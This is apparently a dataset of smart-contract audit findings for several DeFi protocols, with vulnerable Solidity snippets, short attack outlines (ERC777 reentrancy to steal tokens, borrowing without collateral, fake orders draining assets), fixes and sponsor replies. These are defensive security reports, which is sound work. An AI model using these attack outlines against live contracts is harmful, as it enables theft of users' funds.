The calculation of ````totalUSDborrowed```` in ````openLoan()```` is not correctчhighч"```\nfunction openLoan(\n    // // rest of code\n    ) external override whenNotPaused \n    {\n    //// rest of code\n    uint256 colInUSD = priceCollateralToUSD(currencyKey, _colAmount\n                        + collateralPosted[_collateralAddress][msg.sender]);\n    uint256 totalUSDborrowed = _USDborrowed \n        +  (isoUSDLoaned[_collateralAddress][msg.sender] * virtualPrice)/LOAN_SCALE;\n        // @audit should be isoUSDLoanAndInterest[_collateralAddress][msg.sender]\n    require(totalUSDborrowed >= ONE_HUNDRED_DOLLARS, ""Loan Requested too small"");\n    uint256 borrowMargin = (totalUSDborrowed * minOpeningMargin) / LOAN_SCALE;\n    require(colInUSD >= borrowMargin, ""Minimum margin not met!"");\n\n    // // rest of code\n}\n```\n"ч"The `openLoan()` function wrongly use `isoUSDLoaned` to calculate `totalUSDborrowed`. Attacker can exploit it to bypass security check and loan isoUSD with no enough collateral.\nvulnerability point\n```\nfunction openLoan(\n    // // rest of code\n    ) external override whenNotPaused \n    {\n    //// rest of code\n    uint256 colInUSD = priceCollateralToUSD(currencyKey, _colAmount\n                        + collateralPosted[_collateralAddress][msg.sender]);\n    uint256 totalUSDborrowed = _USDborrowed \n        +  (isoUSDLoaned[_collateralAddress][msg.sender] * virtualPrice)/LOAN_SCALE;\n        // @audit should be isoUSDLoanAndInterest[_collateralAddress][msg.sender]\n    require(totalUSDborrowed >= ONE_HUNDRED_DOLLARS, ""Loan Requested too small"");\n    uint256 borrowMargin = (totalUSDborrowed * minOpeningMargin) / LOAN_SCALE;\n    require(colInUSD >= borrowMargin, ""Minimum margin not met!"");\n\n    // // rest of code\n}\n```\n\nAttack example: <1>Attacker normally loans and produces 10000 isoUSD interest <2>Attacker repays principle but left interest <3>Attacker open a new 10000 isoUSD loan without providing collateral"чSee Vulnerability Detail\nDiscussion\nkree-dotcom\nSponsor confirmed, duplicate of issue #68\nkree-dotcom\nFixed https://github.com/kree-dotcom/isomorph/commit/3d77c9f706a52eb6312abc711a007ea8431f749bчAttacker can loan isoUSD with no enough collateral.\nCode Snippet\nTool used\nManual Review
Dangerous assumption on the peg of USDC can lead to manipulationsчmediumч```\n/// @return returns the value of the given synth in sUSD which is assumed to be pegged at $1.\nfunction priceCollateralToUSD(bytes32 _currencyKey, uint256 _amount) public view override returns(uint256){\n    //As it is a synth use synthetix for pricing\n    return (synthetixExchangeRates.effectiveValue(_currencyKey, _amount, SUSD_CODE));      \n}\n```\nчDangerous assumption on the peg of USDC can lead to manipulations\n```\n/// @return returns the value of the given synth in sUSD which is assumed to be pegged at $1.\nfunction priceCollateralToUSD(bytes32 _currencyKey, uint256 _amount) public view override returns(uint256){\n    //As it is a synth use synthetix for pricing\n    return (synthetixExchangeRates.effectiveValue(_currencyKey, _amount, SUSD_CODE));      \n}\n```\n\nAnd sUSD is even less stable than USDC (https://coinmarketcap.com/currencies/susd/).\nTogether with isoUSD not having a stability mechanism, these assumptions can lead to different manipulations with the price of isoUSD and the arbitraging opportunities created by the hard peg assumptions (sUSD and USDC will be priced differently on exchanges and on Isomorph).чConsider using the Chainlink USDC/USD feed to get the price of USDC and price liquidity using the actual price of USDC. Also, consider converting sUSD prices of Synthetix collaterals to USD to mitigate the discrepancy in prices between external exchanges and Isomorph.\nDiscussion\nkree-dotcom\nSponsor confirmed however this is part of the protocol design. That said now that we have the duel oracle system for DepositReceipt_ETH it should not be too difficult to replicate this with minor changes so that the USDC value in DepositReceipt_USDC uses a chainlink oracle also.\nAs for sUSD, we will explore how changes might impact the system. The system is already designed to absorb small fluctuations in the value of sUSD by having a gap between the opening margin and the liquidation margin. However we can see that it can be unfair to a user if they get liquidated because they fairly price their Synth collateral using sUSD = $1.01 rather than the hardcoded exchange rate.чIf the price of USDC falls below $1, collateral will be priced higher than expected. This will keep borrowers from being liquidated. And it will probably affect the price of isoUSD since there will be an arbitrage opportunity: the cheaper USDC will be priced higher as collateral on Isomorph. If hte price of USDC raises above $1, borrowers' collateral will be undervalued and some liquidations will be possible that wouldn't have be allowed if the actual price of USDC was used.\nCode Snippet\n```\nvalue0 = token0Amount * SCALE_SHIFT;\n```\n\n```\n(amountOut, stablePool) = router.getAmountOut(HUNDRED_TOKENS, token1, USDC);\n```\n\nTool used\nManual Review
Wrong constants for time delayчmediumч```\n    uint256 constant ISOUSD_TIME_DELAY = 3; // days;\n```\nчThis protocol uses several constants for time dealy and some of them are incorrect.\n```\n    uint256 constant ISOUSD_TIME_DELAY = 3; // days;\n```\n\n```\n    uint256 public constant CHANGE_COLLATERAL_DELAY = 200; //2 days\n```\nч
Unnecessary precision loss in `_recipientBalance()`чmediumч```\nbalance = elapsedTime_ * (RATE_DECIMALS_MULTIPLIER * tokenAmount_ / duration) / RATE_DECIMALS_MULTIPLIER\n```\nчUsing `ratePerSecond()` to calculate the `_recipientBalance()` incurs an unnecessary precision loss.\nThe current formula in `_recipientBalance()` to calculate the vested amount (balance) incurs an unnecessary precision loss, as it includes div before mul:\n```\nbalance = elapsedTime_ * (RATE_DECIMALS_MULTIPLIER * tokenAmount_ / duration) / RATE_DECIMALS_MULTIPLIER\n```\n\nThis can be avoided and the improved formula can also save some gas.ч
The ````Stream```` contract is designed to receive ETH but not implement function for withdrawalчmediumч"```\ncontract StreamReceiveETHTest is StreamTest {\n    function setUp() public override {\n        super.setUp();\n    }\n\n    function test_receiveETH() public {\n        s = Stream(\n            factory.createStream(\n                payer, recipient, STREAM_AMOUNT, address(token), startTime, stopTime\n            )\n        );\n\n        vm.deal(payer, 10 ether);\n        vm.prank(payer);\n        (bool success, ) = address(s).call{value: 1 ether}("""");\n        assertEq(success, true);\n        assertEq(address(s).balance, 1 ether);\n    }\n}\n```\n"ч"The `Stream` contract instances can receive ETH but can not withdraw, ETH occasionally sent by users will be stuck in those contracts.\nShown as the test case, it can receive ETH normally.\n```\ncontract StreamReceiveETHTest is StreamTest {\n    function setUp() public override {\n        super.setUp();\n    }\n\n    function test_receiveETH() public {\n        s = Stream(\n            factory.createStream(\n                payer, recipient, STREAM_AMOUNT, address(token), startTime, stopTime\n            )\n        );\n\n        vm.deal(payer, 10 ether);\n        vm.prank(payer);\n        (bool success, ) = address(s).call{value: 1 ether}("""");\n        assertEq(success, true);\n        assertEq(address(s).balance, 1 ether);\n    }\n}\n```\n\nResult"ч
If the recipient is added to the USDC blacklist, then cancel() does not workчmediumч```\n    function cancel() external onlyPayerOrRecipient {\n        address payer_ = payer();\n        address recipient_ = recipient();\n        IERC20 token_ = token();\n\n        uint256 recipientBalance = balanceOf(recipient_);\n\n        // This zeroing is important because without it, it's possible for recipient to obtain additional funds\n        // from this contract if anyone (e.g. payer) sends it tokens after cancellation.\n        // Thanks to this state update, `balanceOf(recipient_)` will only return zero in future calls.\n        remainingBalance = 0;\n\n        if (recipientBalance > 0) token_.safeTransfer(recipient_, recipientBalance);\n```\nчcancel() will send the vested USDC to the recipient, if the recipient is added to the USDC blacklist, then cancel() will not work\nWhen cancel() is called, it sends the vested USDC to the recipient and cancels future payments. Consider a scenario where if the payer intends to call cancel() to cancel the payment stream, a malicious recipient can block the address from receiving USDC by adding it to the USDC blacklist (e.g. by doing something malicious with that address, etc.), which prevents the payer from canceling the payment stream and withdrawing future payments\n```\n    function cancel() external onlyPayerOrRecipient {\n        address payer_ = payer();\n        address recipient_ = recipient();\n        IERC20 token_ = token();\n\n        uint256 recipientBalance = balanceOf(recipient_);\n\n        // This zeroing is important because without it, it's possible for recipient to obtain additional funds\n        // from this contract if anyone (e.g. payer) sends it tokens after cancellation.\n        // Thanks to this state update, `balanceOf(recipient_)` will only return zero in future calls.\n        remainingBalance = 0;\n\n        if (recipientBalance > 0) token_.safeTransfer(recipient_, recipientBalance);\n```\nчInstead of sending tokens directly to the payer or recipient in cancel(), consider storing the number of tokens in variables and having the payer or recipient claim it laterчA malicious recipient may prevent the payer from canceling the payment stream and withdrawing future payments\nCode Snippet\nTool used\nManual Review
resolveQueuedTrades() ERC777 re-enter to steal fundsчmediumч```\n    function _openQueuedTrade(uint256 queueId, uint256 price) internal {\n// rest of code\n        if (revisedFee < queuedTrade.totalFee) {\n            tokenX.transfer( //***@audit call transfer , if ERC777 , can re-enter ***/\n                queuedTrade.user,\n                queuedTrade.totalFee - revisedFee\n            );\n        }\n\n        queuedTrade.isQueued = false;  //****@audit  change state****/\n    }\n```\nч"_openQueuedTrade() does not follow the “Checks Effects Interactions” principle and may lead to re-entry to steal the funds\nhttps://fravoll.github.io/solidity-patterns/checks_effects_interactions.html\nThe prerequisite is that tokenX is ERC777 e.g. “sushi”\nresolveQueuedTrades() call _openQueuedTrade()\nin _openQueuedTrade() call ""tokenX.transfer(queuedTrade.user)"" if (revisedFee < queuedTrade.totalFee) before set queuedTrade.isQueued = false;\n```\n    function _openQueuedTrade(uint256 queueId, uint256 price) internal {\n// rest of code\n        if (revisedFee < queuedTrade.totalFee) {\n            tokenX.transfer( //***@audit call transfer , if ERC777 , can re-enter ***/\n                queuedTrade.user,\n                queuedTrade.totalFee - revisedFee\n            );\n        }\n\n        queuedTrade.isQueued = false;  //****@audit  change state****/\n    }\n```\n\n3.if ERC777 re-enter to #cancelQueuedTrade() to get tokenX back,it can close, because queuedTrade.isQueued still equal true 4. back to _openQueuedTrade() set queuedTrade.isQueued = false 5.so steal tokenX"ч
The `_fee()` function is wrongly implemented in the codeчmediumч```\n        (uint256 unitFee, , ) = _fees(10**decimals(), settlementFeePercentage);\n        amount = (newFee * 10**decimals()) / unitFee;\n```\nч_fee() function is wrongly implemented in the code so the protocol will get fewer fees and the trader will earn more\n```\n        (uint256 unitFee, , ) = _fees(10**decimals(), settlementFeePercentage);\n        amount = (newFee * 10**decimals()) / unitFee;\n```\n\nlet's say we have: `newFee` 100 USDC USDC Decimals is 6 `settlementFeePercentage` is 20% ==> 200\nThe `unitFee` will be 520_000\n`amount` = (100 * 1_000_000) / 520_000 `amount` = 192 USDC Which is supposed to be `amount` = 160 USDCчThe `_fee()` function needs to calculate the fees in this way\n```\ntotal_fee = (5000 * amount)/ (10000 - sf)\n```\nч"The protocol will earn fees less than expected\nCode Snippet\n```\n       function checkParams(OptionParams calldata optionParams)\n        external\n        view\n        override\n        returns (\n            uint256 amount,\n            uint256 revisedFee,\n            bool isReferralValid\n        )\n    {\n        require(\n            assetCategory != AssetCategory.Forex ||\n                isInCreationWindow(optionParams.period),\n            ""O30""\n        );\n\n        uint256 maxAmount = getMaxUtilization();\n\n        // Calculate the max fee due to the max txn limit\n        uint256 maxPerTxnFee = ((pool.availableBalance() *\n            config.optionFeePerTxnLimitPercent()) / 100e2);\n        uint256 newFee = min(optionParams.totalFee, maxPerTxnFee);\n\n        // Calculate the amount here from the new fees\n        uint256 settlementFeePercentage;\n        (\n            settlementFeePercentage,\n            isReferralValid\n        ) = _getSettlementFeePercentage(\n            referral.codeOwner(optionParams.referralCode),\n            optionParams.user,\n            _getbaseSettlementFeePercentage(optionParams.isAbove),\n            optionParams.traderNFTId\n        );\n        (uint256 unitFee, , ) = _fees(10**decimals(), settlementFeePercentage);\n        amount = (newFee * 10**decimals()) / unitFee;\n```\n\n```\n    function _fees(uint256 amount, uint256 settlementFeePercentage)\n        internal\n        pure\n        returns (\n            uint256 total,\n            uint256 settlementFee,\n            uint256 premium\n        )\n    {\n        // Probability for ATM options will always be 0.5 due to which we can skip using BSM\n        premium = amount / 2;\n        settlementFee = (amount * settlementFeePercentage) / 1e4;\n        total = settlementFee + premium;\n    }\n```\n\nTool used\nManual Review"
When tokenX is an ERC777 token, users can bypass maxLiquidityчmediumч"```\n         require(\n             balance + tokenXAmount <= maxLiquidity,\n             ""Pool has already reached it's max limit""\n         );\n```\n"ч"When tokenX is an ERC777 token, users can use callbacks to provide liquidity exceeding maxLiquidity\nIn BufferBinaryPool._provide, when tokenX is an ERC777 token, the tokensToSend function of account will be called in tokenX.transferFrom before sending tokens. When the user calls provide again in tokensToSend, since BufferBinaryPool has not received tokens at this time, totalTokenXBalance() has not increased, and the following checks can be bypassed, so that users can provide liquidity exceeding maxLiquidity.\n```\n         require(\n             balance + tokenXAmount <= maxLiquidity,\n             ""Pool has already reached it's max limit""\n         );\n```\n"ч"Change to\n```\n    function _provide(\n        uint256 tokenXAmount,\n        uint256 minMint,\n        address account\n    ) internal returns (uint256 mint) {\n// Add the line below\n        bool success = tokenX.transferFrom(\n// Add the line below\n            account,\n// Add the line below\n            address(this),\n// Add the line below\n            tokenXAmount\n// Add the line below\n        );\n        uint256 supply = totalSupply();\n        uint256 balance = totalTokenXBalance();\n\n        require(\n            balance // Add the line below\n tokenXAmount <= maxLiquidity,\n            ""Pool has already reached it's max limit""\n        );\n\n        if (supply > 0 && balance > 0)\n            mint = (tokenXAmount * supply) / (balance);\n        else mint = tokenXAmount * INITIAL_RATE;\n\n        require(mint >= minMint, ""Pool: Mint limit is too large"");\n        require(mint > 0, ""Pool: Amount is too small"");\n\n// Remove the line below\n        bool success = tokenX.transferFrom(\n// Remove the line below\n            account,\n// Remove the line below\n            address(this),\n// Remove the line below\n            tokenXAmount\n// Remove the line below\n        );\n```\n\nDiscussion\n0x00052\nNeither tokenX (USDC or BFR) are ERC777, so not applicable to current contracts. Something to consider if the team plans to add and ERC777"чusers can provide liquidity exceeding maxLiquidity.\nCode Snippet\nTool used\nManual Review
Limited support to a specific subset of ERC20 tokensчmediumч```\nfunction transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\n var _allowance = allowed[_from][msg.sender];\n\n // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\n // if (_value > _allowance) throw;\n\n uint fee = (_value.mul(basisPointsRate)).div(10000);\n if (fee > maximumFee) {\n  fee = maximumFee;\n }\n if (_allowance < MAX_UINT) {\n  allowed[_from][msg.sender] = _allowance.sub(_value);\n }\n uint sendAmount = _value.sub(fee);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(sendAmount);\n if (fee > 0) {\n  balances[owner] = balances[owner].add(fee);\n  Transfer(_from, owner, fee);\n }\n Transfer(_from, _to, sendAmount);\n}\n```\nч"Buffer contest states 'any ERC20 supported', therefore it should take into account all the different ways of signalling success and failure. This is not the case, as all ERC20's transfer(), transferFrom(), and approve() functions are either not verified at all or verified for returning true. As a result, depending on the ERC20 token, some transfer errors may result in passing unnoticed, and/or some successfull transfer may be treated as failed.\nCurrently the only supported ERC20 tokens are the ones that fulfill both the following requirements:\nalways revert on failure;\nalways returns boolean true on success.\nAn example of a very well known token that is not supported is Tether USD (USDT).\n👋 IMPORTANT This issue is not the same as reporting that ""return value must be verified to be true"" where the checks are missing! Indeed such a simplistic report should be considered invalid as it still does not solve all the problems but rather introduces others. See Vulnerability Details section for rationale.\nTokens have different ways of signalling success and failure, and this affect mostly transfer(), transferFrom() and approve() in ERC20 tokens. While some tokens revert upon failure, others consistently return boolean flags to indicate success or failure, and many others have mixed behaviours.\nSee below a snippet of the USDT Token contract compared to the 0x's ZRX Token contract where the USDT Token transfer function does not even return a boolean value, while the ZRX token consistently returns boolean value hence returning false on failure instead of reverting.\nUSDT Token snippet (no return value) from Etherscan\n```\nfunction transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\n var _allowance = allowed[_from][msg.sender];\n\n // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\n // if (_value > _allowance) throw;\n\n uint fee = (_value.mul(basisPointsRate)).div(10000);\n if (fee > maximumFee) {\n  fee = maximumFee;\n }\n if (_allowance < MAX_UINT) {\n  allowed[_from][msg.sender] = _allowance.sub(_value);\n }\n uint sendAmount = _value.sub(fee);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(sendAmount);\n if (fee > 0) {\n  balances[owner] = balances[owner].add(fee);\n  Transfer(_from, owner, fee);\n }\n Transfer(_from, _to, sendAmount);\n}\n```\n\nZRX Token snippet (consistently true or false boolean result) from Etherscan\n```\nfunction transferFrom(address _from, address _to, uint _value) returns (bool) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\n  balances[_to] += _value;\n  balances[_from] -= _value;\n  allowed[_from][msg.sender] -= _value;\n  Transfer(_from, _to, _value);\n  return true;\n } else { return false; }\n}\n```\n"ч"To handle most of these inconsistent behaviors across multiple tokens, either use OpenZeppelin's SafeERC20 library, or use a more reusable implementation (i.e. library) of the following intentionally explicit, descriptive example code for an ERC20 transferFrom() call that takes into account all the different ways of signalling success and failure, and apply to all ERC20 transfer(), transferFrom(), approve() calls in the Buffer contracts.\n```\nIERC20 token = whatever_token;\n\n(bool success, bytes memory returndata) = address(token).call(abi.encodeWithSelector(IERC20.transferFrom.selector, sender, recipient, amount));\n\n// if success == false, without any doubts there was an error and callee reverted\nrequire(success, ""Transfer failed!"");\n\n// if success == true, we need to check whether we got a return value or not (like in the case of USDT)\nif (returndata.length > 0) {\n // we got a return value, it must be a boolean and it should be true\n require(abi.decode(returndata, (bool)), ""Transfer failed!"");\n} else {\n // since we got no return value it can be one of two cases:\n // 1. the transferFrom does not return a boolean and it did succeed\n // 2. the token address is not a contract address therefore call() always return success = true as per EVM design\n // To discriminate between 1 and 2, we need to check if the address actually points to a contract\n require(address(token).code.length > 0, ""Not a token address!"");\n}\n```\n"чThe ERC20 token being traded is one that consistently returns a boolean result in the case of success and failure like for example 0x's ZRX Token contract. Where the return value is currently not verified to be true (i.e.: #1, #2, #3, #4, #5, #6) the transfer may fail (e.g.: no tokens transferred due to insufficient balance) but the error would not be detected by the Buffer contracts.\nThe ERC20 token being traded is one that do not return a boolean value like for example the well knonw Tether USD Token contract. Successful transfers would cause a revert in the Buffer contracts where the return value is verified to be true (i.e.: #1, #2, #3, #4) due to the token not returing boolean results.\nSame is true for appove calls.\nCode Snippet\nTool used\nManual Review
The `_fee()` function is wrongly implemented in the codeчmediumч```\n        (uint256 unitFee, , ) = _fees(10**decimals(), settlementFeePercentage);\n        amount = (newFee * 10**decimals()) / unitFee;\n```\nч_fee() function is wrongly implemented in the code so the protocol will get fewer fees and the trader will earn more\n```\n        (uint256 unitFee, , ) = _fees(10**decimals(), settlementFeePercentage);\n        amount = (newFee * 10**decimals()) / unitFee;\n```\n\nlet's say we have: `newFee` 100 USDC USDC Decimals is 6 `settlementFeePercentage` is 20% ==> 200\nThe `unitFee` will be 520_000\n`amount` = (100 * 1_000_000) / 520_000 `amount` = 192 USDC Which is supposed to be `amount` = 160 USDCч
Bulls that are unable to receive NFTs will not be able to claim them laterчmediumч```\ntry IERC721(order.collection).safeTransferFrom(bear, bull, tokenId) {}\ncatch (bytes memory) {\n    // Transfer NFT to BvbProtocol\n    IERC721(order.collection).safeTransferFrom(bear, address(this), tokenId);\n    // Store that the bull has to retrieve it\n    withdrawableCollectionTokenId[order.collection][tokenId] = bull;\n}\n\nuint bearAssetAmount = order.premium + order.collateral;\nif (bearAssetAmount > 0) {\n    // Transfer payment tokens to the Bear\n    IERC20(order.asset).safeTransfer(bear, bearAssetAmount);\n}\n```\nчA lot of care has been taken to ensure that, if a bull has a contract address that doesn't accept ERC721s, the NFT is saved to `withdrawableCollectionTokenId` for later withdrawal. However, because there is no way to withdraw this token to a different address (and the original address doesn't accept NFTs), it will never be able to be claimed.\nTo settle a contract, the bear calls `settleContract()`, which sends their NFT to the bull, and withdraws the collateral and premium to the bear.\n```\ntry IERC721(order.collection).safeTransferFrom(bear, bull, tokenId) {}\ncatch (bytes memory) {\n    // Transfer NFT to BvbProtocol\n    IERC721(order.collection).safeTransferFrom(bear, address(this), tokenId);\n    // Store that the bull has to retrieve it\n    withdrawableCollectionTokenId[order.collection][tokenId] = bull;\n}\n\nuint bearAssetAmount = order.premium + order.collateral;\nif (bearAssetAmount > 0) {\n    // Transfer payment tokens to the Bear\n    IERC20(order.asset).safeTransfer(bear, bearAssetAmount);\n}\n```\n\nIn order to address the case that the bull is a contract that can't accept NFTs, the protocol uses a try-catch setup. If the transfer doesn't succeed, it transfers the NFT into the contract, and sets `withdrawableCollectionTokenId` so that the specific NFT is attributed to the bull for later withdrawal.\nHowever, assuming the bull isn't an upgradeable contract, this withdrawal will never be possible, because their only option is to call the same function `safeTransferFrom` to the same contract address, which will fail in the same way.\n```\nfunction withdrawToken(bytes32 orderHash, uint tokenId) public {\n    address collection = matchedOrders[uint(orderHash)].collection;\n\n    address recipient = withdrawableCollectionTokenId[collection][tokenId];\n\n    // Transfer NFT to recipient\n    IERC721(collection).safeTransferFrom(address(this), recipient, tokenId);\n\n    // This token is not withdrawable anymore\n    withdrawableCollectionTokenId[collection][tokenId] = address(0);\n\n    emit WithdrawnToken(orderHash, tokenId, recipient);\n}\n```\nчThere are a few possible solutions:\nAdd a `to` field in the `withdrawToken` function, which allows the bull `to` withdraw the NFT `to` another address\nCreate a function similar `to` `transferPosition` that can be used `to` transfer owners of a withdrawable NFT\nDecide that you want `to` punish bulls who aren't able `to` receive NFTs, in which case there is no need `to` save their address or implement a `withdrawToken` function\nDiscussion\ndatschill\nPR fixing another issue, removing the withdrawToken() method : https://github.com/BullvBear/bvb-solidity/pull/14\ndatschill\nThis issue isn't High, because in the default behavior, no smart contract can match an Order. So for a Bull to be a smart contract, the user needs to match an order (as a maker or a taker) with an EOA, then transfer his position to a smart contract. This would be kind of a poweruser move, so we consider that he should be aware that his smart contract should handle NFT reception. Whatsoever, the issue is fixed thanks to the PR#14, the user will be able to transfer his position to whatever EOA or smart contract he wants before calling reclaimContract() to retrieve ERC20 assets or ERC721.чIf a bull is a contract that can't receive NFTs, their orders will be matched, the bear will be able to withdraw their assets, but the bull's NFT will remain stuck in the BVB protocol contract.\nCode Snippet\nTool used\nManual Review
Attackers can use `reclaimContract()` to transfer assets in protocol to address(0)чhighч"```\n    function reclaimContract(Order calldata order) public nonReentrant {\n        bytes32 orderHash = hashOrder(order);\n\n        // ContractId\n        uint contractId = uint(orderHash);\n\n        address bull = bulls[contractId];\n\n        // Check that the contract is expired\n        require(block.timestamp > order.expiry, ""NOT_EXPIRED_CONTRACT"");\n\n        // Check that the contract is not settled\n        require(!settledContracts[contractId], ""SETTLED_CONTRACT"");\n\n        // Check that the contract is not reclaimed\n        require(!reclaimedContracts[contractId], ""RECLAIMED_CONTRACT"");\n\n        uint bullAssetAmount = order.premium + order.collateral;\n        if (bullAssetAmount > 0) {\n            // Transfer payment tokens to the Bull\n            IERC20(order.asset).safeTransfer(bull, bullAssetAmount);\n        }\n\n        reclaimedContracts[contractId] = true;\n\n        emit ReclaimedContract(orderHash, order);\n    }\n```\n"ч"`reclaimContract()` would transfer payment tokens to `bulls[contractId]`. An attacker can make `reclaimContract()` transfer assets to address(0).\nAn attacker can use a fake order to trick `reclaimContract()`. The fake order needs to meet the following requirements:\n`block.timestamp > order.expiry`.\n`!settledContracts[contractId]`.\n`!reclaimedContracts[contractId],`.\nThe first one is easy to fulfilled, an attacker can decide the content of the fake order. And the others are all satisfied since the fake order couldn’t be settled or reclaimed before.\n```\n    function reclaimContract(Order calldata order) public nonReentrant {\n        bytes32 orderHash = hashOrder(order);\n\n        // ContractId\n        uint contractId = uint(orderHash);\n\n        address bull = bulls[contractId];\n\n        // Check that the contract is expired\n        require(block.timestamp > order.expiry, ""NOT_EXPIRED_CONTRACT"");\n\n        // Check that the contract is not settled\n        require(!settledContracts[contractId], ""SETTLED_CONTRACT"");\n\n        // Check that the contract is not reclaimed\n        require(!reclaimedContracts[contractId], ""RECLAIMED_CONTRACT"");\n\n        uint bullAssetAmount = order.premium + order.collateral;\n        if (bullAssetAmount > 0) {\n            // Transfer payment tokens to the Bull\n            IERC20(order.asset).safeTransfer(bull, bullAssetAmount);\n        }\n\n        reclaimedContracts[contractId] = true;\n\n        emit ReclaimedContract(orderHash, order);\n    }\n```\n"чThere are multiple solutions for this problem.\ncheck `bulls[contractId] != address(0)`\ncheck the order is matched `matchedOrders[contractId].maker != address(0)`\nDiscussion\ndatschill\nPR fixing this issue : https://github.com/BullvBear/bvb-solidity/pull/4чAn attacker can use this vulnerability to transfer assets from BvB to address(0). It results in serious loss of funds.\nCode Snippet\nTool used\nManual Review
Fixed Term Bond tokens can be minted with non-rounded expiryчmediumч```\n// rest of code\nexpiry = ((vesting_ + uint48(block.timestamp)) / uint48(1 days)) * uint48(1 days);\n\n// Fixed-term user payout information is handled in BondTeller.\n// Teller mints ERC-1155 bond tokens for user.\nuint256 tokenId = getTokenId(payoutToken_, expiry);\n\n// Create new bond token if it doesn't exist yet\nif (!tokenMetadata[tokenId].active) {\n    _deploy(tokenId, payoutToken_, expiry);\n}\n// rest of code\n```\nчFixed Term Tellers intend to mint tokens that expire once per day, to consolidate liquidity and create a uniform experience. However, this rounding is not enforced on the external `deploy()` function, which allows for tokens expiring at unexpected times.\n```\n// rest of code\nexpiry = ((vesting_ + uint48(block.timestamp)) / uint48(1 days)) * uint48(1 days);\n\n// Fixed-term user payout information is handled in BondTeller.\n// Teller mints ERC-1155 bond tokens for user.\nuint256 tokenId = getTokenId(payoutToken_, expiry);\n\n// Create new bond token if it doesn't exist yet\nif (!tokenMetadata[tokenId].active) {\n    _deploy(tokenId, payoutToken_, expiry);\n}\n// rest of code\n```\n\nThis successfully consolidates all liquidity into one daily tokenId, which expires (as expected) at the time included in the tokenId.\nHowever, if the `deploy()` function is called directly, no such rounding occurs:\n```\nfunction deploy(ERC20 underlying_, uint48 expiry_)\n    external\n    override\n    nonReentrant\n    returns (uint256)\n{\n    uint256 tokenId = getTokenId(underlying_, expiry_);\n    // Only creates token if it does not exist\n    if (!tokenMetadata[tokenId].active) {\n        _deploy(tokenId, underlying_, expiry_);\n    }\n    return tokenId;\n}\n```\n\nThis creates a mismatch between the tokenId time and the real expiry time, as tokenId is calculated by rounding the expiry down to the nearest day:\n```\nuint256 tokenId = uint256(\n    keccak256(abi.encodePacked(underlying_, expiry_ / uint48(1 days)))\n);\n```\n\n... while the `_deploy()` function saves the original expiry:\n```\ntokenMetadata[tokenId_] = TokenMetadata(\n    true,\n    underlying_,\n    uint8(underlying_.decimals()),\n    expiry_,\n    0\n);\n```\nч
Fixed Term Teller tokens can be created with an expiry in the pastчhighч```\nif (expiry_ < block.timestamp) revert Teller_InvalidParams();\n```\nчThe Fixed Term Teller does not allow tokens to be created with a timestamp in the past. This is a fact that protocols using this feature will expect to hold and build their systems around. However, users can submit expiry timestamps slightly in the future, which correlate to tokenIds in the past, which allows them to bypass this check.\n```\nif (expiry_ < block.timestamp) revert Teller_InvalidParams();\n```\n\nHowever, because tokenIds round timestamps down to the latest day, protocols are able to get around this check.\nHere's an example:\nThe most recently expired token has an expiration time of 1668524400 (correlates to 9am this morning)\nIt is currently 1668546000 (3pm this afternoon)\nA protocol calls create() with an expiry of 1668546000 + 1\nThis passes the check that `expiry_ >= block.timestamp`\nWhen the expiry is passed to `getTokenId()` it rounds the time down to the latest day, which is the day corresponding with 9am this morning\nThis expiry associated with this tokenId is 9am this morning, so they are able to redeem their tokens instantlyч
findMarketFor() missing check minAmountOut_чmediumч```\n    function findMarketFor(\n        address payout_,\n        address quote_,\n        uint256 amountIn_,\n        uint256 minAmountOut_,\n        uint256 maxExpiry_\n    ) external view returns (uint256) {\n// rest of code\n            if (expiry <= maxExpiry_) {\n                payouts[i] = minAmountOut_ <= maxPayout\n                    ? payoutFor(amountIn_, ids[i], address(0))\n                    : 0;\n\n                if (payouts[i] > highestOut) {//****@audit not check payouts[i] >= minAmountOut_******//\n                    highestOut = payouts[i];\n                    id = ids[i];\n                }\n            }\n```\nч"BondAggregator#findMarketFor() minAmountOut_ does not actually take effect，may return a market's ""payout"" smaller than minAmountOut_ , Causes users to waste gas calls to purchase\nBondAggregator#findMarketFor() has check minAmountOut_ <= maxPayout but the actual ""payout"" by ""amountIn_"" no check greater than minAmountOut_\n```\n    function findMarketFor(\n        address payout_,\n        address quote_,\n        uint256 amountIn_,\n        uint256 minAmountOut_,\n        uint256 maxExpiry_\n    ) external view returns (uint256) {\n// rest of code\n            if (expiry <= maxExpiry_) {\n                payouts[i] = minAmountOut_ <= maxPayout\n                    ? payoutFor(amountIn_, ids[i], address(0))\n                    : 0;\n\n                if (payouts[i] > highestOut) {//****@audit not check payouts[i] >= minAmountOut_******//\n                    highestOut = payouts[i];\n                    id = ids[i];\n                }\n            }\n```\n"ч```\n    function findMarketFor(\n        address payout_,\n        address quote_,\n        uint256 amountIn_,\n        uint256 minAmountOut_,\n        uint256 maxExpiry_\n    ) external view returns (uint256) {\n// rest of code\n            if (expiry <= maxExpiry_) {\n                payouts[i] = minAmountOut_ <= maxPayout\n                    ? payoutFor(amountIn_, ids[i], address(0))\n                    : 0;\n\n-               if (payouts[i] > highestOut) {\n+               if (payouts[i] >= minAmountOut_ && payouts[i] > highestOut) {\n                    highestOut = payouts[i];\n                    id = ids[i];\n                }\n            }\n```\n\nDiscussion\nEvert0x\nMessage from sponsor\n\nAgree with this issue. We implemented a check for `payout >= minAmountOut_` within the loop.\nxiaoming9090\nFixed in https://github.com/Bond-Protocol/bonds/commit/7197f68354863c7b9be604d637cbc9b62105704bчThe user gets the optimal market through BondAggregator#findMarketFor(), but incorrectly returns a market smaller than minAmountOut_, and the call to purchase must fail, resulting in wasted gas\nCode Snippet\nTool used\nManual Review
